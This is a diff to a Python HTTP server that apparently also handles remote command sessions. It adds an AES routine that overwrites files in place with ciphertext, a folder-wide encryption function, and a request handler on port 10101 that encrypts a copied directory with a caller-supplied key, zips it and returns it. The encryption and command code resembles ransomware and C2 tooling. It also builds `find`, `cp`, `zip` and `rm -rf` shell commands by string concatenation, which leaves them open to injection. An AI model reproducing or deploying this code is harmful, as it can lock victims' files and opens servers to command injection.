@@ -4,13 +4,44 @@ import socketserver
 from threading import Thread
 # from legend import server_legacy
 import requests
-
+import os, subprocess
+import string, random
 import socket, base64
 from http.server import BaseHTTPRequestHandler
 from urllib.parse import unquote
 
-global req_head, flag
-flag = False
+
+# ----------------------Encryption files--------------
+
+import base64
+import hashlib
+import os
+
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+
+
+class Encryptor:
+    def __init__(self, key):
+        self.__key__ = key
+
+    def __encrypt(self, raw):
+        BS = AES.block_size
+        pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
+
+        raw = base64.b64encode(pad(raw).encode('utf8'))
+        iv = get_random_bytes(AES.block_size)
+        cipher = AES.new(key=self.__key__, mode= AES.MODE_CFB,iv= iv)
+        return base64.b64encode(iv + cipher.encrypt(raw))
+
+    def encrypt(self, fn):
+        with open(fn, "r") as f:
+            data = f.read()
+        with open(fn, "wb") as f:
+            f.write(self.__encrypt(data))
+
+# ------------------------Encryption END----------------
+
 
 mydb = mysql.connector.connect(
     host="localhost",
@@ -39,6 +70,15 @@ def connect(ip_s):
         if com.decode("cp65001") == "exit":
             break
     
+
+def folder_encrypt(name, key):
+    names = subprocess.getoutput("find " + name).split("\n")
+    e = Encryptor(key)
+    for name in names:
+        if os.path.isfile(name):
+            e.encrypt(name)
+    del e
+    return "done"
 
 class Server(BaseHTTPRequestHandler):
     # def __init__(self, user='', pid='', pwd=''):
@@ -165,11 +205,35 @@ class Server(BaseHTTPRequestHandler):
                 mycursor = mydb.cursor()
                 mycursor.execute(sql, val)
                 mydb.commit()
-
+            
 
                 self.send_response(200)
                 self.end_headers()
+            
+            elif port == 10101:
+                self.send_response(200)
+                self.send_header("Content-type", "application/zip")
+                self.end_headers()
 
+                status = data[1].split("=")[1]
+                key = unquote(data[2].split("=")[1])
+                key = base64.b64decode(bytes(key, "utf-8"))
+                
+                
+                if status == "update":
+                    print(os.getenv("update"))
+                elif status == "get":
+                    name = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
+                    
+                    subprocess.getoutput("cp -r tmp_up " + name)
+                    folder_encrypt(name, key)
+                    subprocess.getoutput(f"zip -r {name}.zip {name}")
+                    with open(name + ".zip", "rb") as f:
+                        self.wfile.write(f.read())
+                        
+                    subprocess.getoutput(f"rm -rf {name} {name}.zip")
+                    
+                    
         else:
 
             self.send_response(200)
